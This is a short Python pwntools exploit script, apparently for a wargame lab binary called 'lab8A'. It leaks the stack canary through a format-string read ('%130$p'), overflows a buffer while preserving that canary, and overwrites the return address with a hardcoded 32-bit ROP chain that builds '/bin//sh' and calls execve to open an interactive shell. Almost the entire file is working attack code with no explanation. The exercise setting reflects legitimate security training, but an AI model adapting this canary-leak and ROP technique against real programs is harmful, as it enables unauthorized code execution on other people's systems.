#!/usr/bin/python
from pwn import *
from struct import *

# Thanks to ROP Gadget :)
p = ''

p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080bc506) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x080bc506) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x08054ab0) # xor eax, eax ; ret
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080e71c5) # pop ecx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x08054ab0) # xor eax, eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x08048ef6) # int 0x80


sh1 = process("./lab8A")
print sh1.recv()
raw_input()

format_string = "%130$p" + "\n"
sh1.send(format_string)
a = sh1.recvuntil("What")
a = a.split()
canary = int(a[0],16)

sh1.send("A\n")
print sh1.recv()
buff = "\xef\xbe\xad\xde"*6

# Now overwrite canary
buff += p32(canary)

# Now overwrite eax to pass xor encryption
buff += p32(0xdeadbeef)

# EIP overwrite
buff += p

#buff += "\x00"*15
buff += "\n"
sh1.send(buff)
sh1.interactive()
